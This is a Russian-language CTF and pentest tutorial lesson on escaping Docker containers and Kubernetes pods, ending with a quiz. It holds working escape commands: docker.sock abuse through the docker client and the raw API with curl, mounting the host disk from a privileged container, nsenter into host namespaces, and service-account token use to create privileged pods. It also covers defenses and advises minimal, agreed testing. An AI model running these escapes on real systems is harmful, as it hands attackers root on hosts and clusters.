---
id: misc-docker-misc
title: "Docker/K8s misc escape: побег из контейнера"
category: misc
parent: misc-sandbox-containers
difficulty: hard
order: 1
tags: [docker, kubernetes, container, escape, namespace, ctf]
prerequisites: [misc-sandbox]
useful_for:
  - "CTF Misc: побег из контейнера в задаче"
  - "Пентест: аудит контейнерной изоляции"
  - "Cloud security: побег из подов Kubernetes"
estimated_minutes: 30
summary: "Практический побег из Docker-контейнера и Kubernetes-пода: docker.sock, privileged, монтирования хоста, cgroup release_agent, nsenter и проверка изоляции."
---

## Вопрос, с которого всё начинается

Тебе дали шелл в CTF-задаче: ты внутри контейнера, флаг лежит на хосте. Контейнер — не виртуальная машина, а набор **namespaces** (изолированных «миров»: PID, сеть, монтирования) и **cgroups** (ограничений ресурсов) поверх общего ядра. Пока изоляция полная — ты заперт. Но если контейнер где-то **пересекается** с хостом, из него можно «сбежать». Вся задача — найти это пересечение.

Разберём побег шаг за шагом.

## Наш пример: мы внутри контейнера

Первое правило — не гадать, а посмотреть, где мы. Собираем признаки:

```bash
$ cat /proc/1/cgroup
0::/
$ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 /.dockerenv
$ cat /proc/self/status | grep -E 'Cap(Eff|Bnd)'
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
```

Файл `/.dockerenv` есть почти в каждом Docker-контейнере, а `cgroup` без пути `kubepods` говорит, что это, скорее всего, Docker, а не Kubernetes. `CapEff` (эффективные capabilities — «права») нулевые: пока мы не привилегированы. Дальше ищем мосты к хосту.

## Шаг 1: ищем «пересечения» с хостом

Побег возможен там, где контейнер делит что-то с хостом. Проверяем четыре места:

```bash
$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 ... /var/run/docker.sock
$ grep -E '/host|/proc|/sys|/var/run' /proc/self/mountinfo | head -3
... /var/run/docker.sock ...
$ ls -la /proc/1/ns/
lrwxrwxrwx ... pid -> pid:[4026531836]
```

Есть **docker.sock** — UNIX-сокет, через который клиент `docker` общается с демоном. Если он смонтирован в контейнер, мы можем управлять демоном хоста. Это и есть пересечение.

## Шаг 2: docker.sock — полный контроль над хостом

Docker-демон на хосте запускает контейнеры **от root**. Значит, кто говорит с сокетом — тот фактически root. Проверяем:

```bash
$ docker -H unix:///var/run/docker.sock ps
CONTAINER ID   IMAGE    ...   NAMES
a1b2c3d4e5f6   target   ...   victim
```

Демон отвечает — доступ есть. Теперь создаём свой контейнер с монтированием корня хоста в `/host` и читаем флаг:

```bash
$ docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine \
    chroot /host cat /root/flag.txt
FLAG{docker_sock_is_root}
```

Если клиента `docker` в контейнере нет — работаем напрямую через API:

```bash
$ curl --unix-socket /var/run/docker.sock http://localhost/version
{"Version":"24.0.7",...}
$ curl --unix-socket /var/run/docker.sock -X POST \
    'http://localhost/containers/create?name=pwn' \
    -H 'Content-Type: application/json' \
    -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'
```

Сокет — самый частый и самый «дешёвый» вектор побега в CTF.

## Шаг 3: privileged и capabilities

Если сокета нет, смотрим права. **Capabilities** — это раздробленные root-привилегии: `CAP_SYS_ADMIN` (монтирование, cgroup, доступ к `/proc`), `CAP_NET_RAW`, `CAP_SYS_PTRACE` и другие. Полный набор выглядит так:

```bash
$ cat /proc/self/status | grep CapEff
CapEff: 0000003fffffffff
$ capsh --print
Current: cap_sys_admin,cap_sys_ptrace,cap_net_raw,...
```

`0000003fffffffff` — почти все capability, то есть контейнер привилегированный. Тогда монтируем диск хоста:

```bash
$ fdisk -l
Disk /dev/sda: 40 GiB ...
$ mkdir /mnt/host && mount /dev/sda1 /mnt/host
$ chroot /mnt/host sh
```

Без монтирования, но с `CAP_SYS_ADMIN`, работает трюк с **release_agent**: cgroup при «опустошении» запускает скрипт на хосте, и мы указываем туда свой путь (CVE-2022-0492 — тот же класс).

## Шаг 4: смонтированный hostPath и nsenter

Иногда корень хоста смонтирован в контейнер явно (часто в `/host`). Смотрим `/proc/self/mountinfo` и идём туда. Отдельный вектор — общий **PID namespace** (`--pid=host`): тогда мы видим процессы хоста и заходим в их окружение через `nsenter`:

```bash
$ ls -la /proc/1/ns/
lrwxrwxrwx ... mnt -> mnt:[4026531832]
$ nsenter --target 1 --mount --uts --ipc --net --pid -- sh
```

`nsenter` входит в namespaces процесса с PID 1 — если это процесс хоста, мы оказываемся на хосте. Если `nsenter` в контейнере нет, те же namespaces доступны через `/proc/1/ns/`.

## Шаг 5: Kubernetes — serviceaccount token

Если `cgroup` содержит `kubepods`, мы в поде Kubernetes. У пода есть **service account** — учётная запись для доступа к API кластера, а её токен лежит в файле:

```bash
$ ls /var/run/secrets/kubernetes.io/serviceaccount/
ca.crt  namespace  token
$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ kubectl --token=$TOKEN --server=https://kubernetes.default --insecure-skip-tls-verify auth can-i --list
```

Дальше смотрим, что разрешено. Если можно создавать поды с `hostPath: /` или `privileged: true` — монтируем корень узла и читаем всё:

```bash
$ kubectl get pods --all-namespaces
$ kubectl create -f evil-pod.yaml     # privileged + hostPath /
```

Соседние векторы в кластере: kubelet на порту `10250` (иногда даёт exec в поды) и etcd на `2379` без аутентификации (дамп секретов).

## Шаг 6: ядерные уязвимости — крайний случай

Иногда конфигурация чистая, но уязвимо ядро или рантайм: перезапись бинарника `runc` при `exec` (CVE-2019-5736), `Dirty Pipe` (CVE-2022-0847), `overlayfs` (CVE-2023-0386). Признак — необычная версия (`uname -r`) и старый Docker/containerd. Это **крайний случай**: сначала исчерпай конфигурационные векторы (сокет, привилегии, монтирования) — они надёжнее и не роняют систему.

## Если не сработало

Не всякая находка даёт побег — разберём типовые тупики и что делать вместо них.

**docker.sock есть, но клиента `docker` нет.** Клиент — это просто удобная обёртка над HTTP-API демона. Ставим `curl` (или используем `wget`) и говорим с сокетом напрямую: `GET /version` проверяет доступ, `POST /containers/create` с полем `Binds` создаёт контейнер с монтированием хоста, `POST /containers/{id}/start` его запускает. Если `curl` тоже отсутствует, тот же запрос можно собрать на Python через модуль `socket` — протокол HTTP поверх UNIX-сокета описан в документации Docker Engine API.

**Сокет доступен только на чтение или защищён правами.** Проверяем `ls -l /var/run/docker.sock`: если владелец — группа `docker`, а наша учётка в неё не входит, напрямую не выйдет. Иногда помогает смена пользователя внутри контейнера (`su`) или запуск от root, если он доступен.

**Контейнер привилегированный, но `mount` не работает.** При `CAP_SYS_ADMIN` монтирование может блокировать `seccomp` или отсутствие `/dev/sda`. Смотрим `lsblk` и `/proc/partitions`: если блочного устройства хоста не видно, монтировать нечего. Тогда пробуем cgroup-трюк с `release_agent` — он не требует доступа к диску, а лишь права на запись в cgroup-иерархию.

**Мы в Kubernetes, но `kubectl` нет.** API кластера — обычный HTTPS. Обращаемся к нему напрямую: `curl --cacert ca.crt -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/namespaces` перечисляет объекты, а создание привилегированного пода — это `POST` в `/apis/.../pods` с JSON-манифестом. Права проверяются эндпоинтом `SelfSubjectAccessReview`.

**Ничего из перечисленного не найдено.** Это не приговор: конфигурация может быть чистой, но уязвимым может оказаться ядро. Тогда смотрим `uname -r` и версию рантайма — `runc`, `containerd` — и сопоставляем с известными CVE. Но помни: ядерные эксплойты — крайний случай, они рискованны и могут уронить хост.

## Частые вопросы

**Чем namespaces отличается от виртуальной машины?** Namespaces изолируют *видимость* ресурсов (процессы, сеть, точки монтирования), но ядро — общее. В ВМ своё ядро, поэтому там нет «побега» в привычном смысле. Именно общее ядро делает пересечения контейнера и хоста опасными.

**Почему docker.sock называют «равным root»?** Демон работает от root и по запросу может запустить контейнер с любыми монтированиями и привилегиями. Кто управляет демоном — тот распоряжается хостом.

**Что важнее — искать CVE или смотреть конфигурацию?** Сначала конфигурацию. Забытый сокет, `--privileged`, лишние монтирования встречаются в CTF и в реальных кластерах гораздо чаще, чем свежая ядерная уязвимость.

**Как понять, что мы в Kubernetes, а не в Docker?** По `cgroup`: путь содержит `kubepods`. Плюс характерные файлы — `/var/run/secrets/kubernetes.io/serviceaccount/token`, переменные окружения `KUBERNETES_SERVICE_HOST`.

## Что важно в реальном аудите

В пентесте побег из контейнера — это доказательство, а не самоцель. Найдя вектор, зафиксируй его *минимальным* воспроизведением: вместо монтирования всего корня хоста прочитай один файл-маркер (`/etc/hostname`, `/root/flag.txt`), чтобы не менять состояние системы. Операции, способные уронить или скомпрометировать продакшн, — `--privileged`-контейнеры, запись в `release_agent`, ядерные эксплойты — согласуй с заказчиком заранее.

Защита строится на принципе минимальных привилегий: не монтировать docker.sock в контейнеры, отказаться от `--privileged`, включить user namespaces и rootless-режим, ограничить capabilities и задать профили seccomp/AppArmor. Отдельно проверяют, что секреты не лежат в переменных окружения контейнера: они видны любому процессу внутри и часто попадают в логи.

## Что мы теперь знаем

- Контейнер — это **namespaces + cgroups**, а не отдельное ядро; побег ищет пересечение с хостом.
- **docker.sock** даёт управление демоном хоста — это полноценный root.
- **`CapEff`** показывает привилегии; `CAP_SYS_ADMIN` открывает монтирование и cgroup.
- **Смонтированный hostPath** и общий **PID namespace** (`nsenter`) — прямые мосты на хост.
- В Kubernetes **serviceaccount token** даёт доступ к API; `hostPath`/`privileged` поды — побег.
- **Ядерные CVE** — крайний случай, а не первый выбор.

## На что смотреть дальше

Порядок разведки: `cgroup` → `/.dockerenv` → `CapEff`/`capsh` → `mountinfo` → сокеты → `serviceaccount`. Каждый найденный признак — отдельный вектор. Дальше читай `misc-seccomp-escape` (фильтры syscall), `misc-namespace-escape` (namespaces/cgroups) и `cloud-*` про Kubernetes. В реальном аудите цель — не флаг, а понимание, **почему** контейнер получил лишнее пересечение (забытый `-v /var/run/docker.sock`, `privileged: true` в манифесте). Полезно завести привычку: как только получаешь шелл в контейнере, первым делом прогоняй скрипт-триаж из урока и сохраняй вывод — по нему видно, какой вектор доступен, без слепых попыток.

## Квиз

Проверь себя.

```quiz
- question: "Почему доступ к /var/run/docker.sock фактически равен побегу?"
  options:
    - "это просто лог-файл"
    - "через сокет можно управлять демоном и запускать контейнеры с монтированием хоста"
    - "это файл с SSH-ключами"
    - "это шрифт"
  answer: 1
  explanation: "Docker-демон запускает контейнеры от root хоста."
- question: "Какая capability открывает монтирование и работу с cgroup?"
  options:
    - "CAP_NET_RAW"
    - "CAP_SYS_ADMIN"
    - "CAP_CHOWN"
    - "CAP_SETUID"
  answer: 1
  explanation: "CAP_SYS_ADMIN — самая мощная capability в контексте побега."
- question: "Что делает release_agent в cgroup?"
  options:
    - "освобождает память процесса"
    - "запускает скрипт на хосте при опустошении cgroup"
    - "удаляет контейнер"
    - "шифрует диск"
  answer: 1
  explanation: "Известный вектор побега при наличии CAP_SYS_ADMIN."
- question: "Зачем в поде Kubernetes читают serviceaccount token?"
  options:
    - "для красоты отчёта"
    - "чтобы обращаться к API кластера с правами service account"
    - "чтобы ускорить сеть"
    - "чтобы сжать логи"
  answer: 1
  explanation: "Токен аутентифицирует вас в API-сервере кластера."
- question: "С чего начинается побег из контейнера?"
  options:
    - "сразу mount /dev/sda"
    - "с разведки: платформа, capabilities, namespaces, монтирования"
    - "с удаления контейнера"
    - "с перезагрузки хоста"
  answer: 1
  explanation: "От разведки зависит выбор рабочего вектора."
```

## Куда дальше

В следующем уроке `misc-seccomp-escape` мы разберём другой слой изоляции — **seccomp**: фильтр системных вызовов, который запрещает `execve` и заставляет писать ORW-шеллкод. А пока главное запомни: **контейнер безопасен ровно настолько, насколько полно он изолирован** — ищи то, что он делит с хостом.

## Где пригодится

- **CTF misc** — задачи на побег из контейнера.
- **Пентест** — аудит изоляции Docker/Kubernetes.
- **Cloud security** — побег из подов EKS/GKE/AKS.
- **Работа/SOC** — понимание признаков компрометации контейнера.
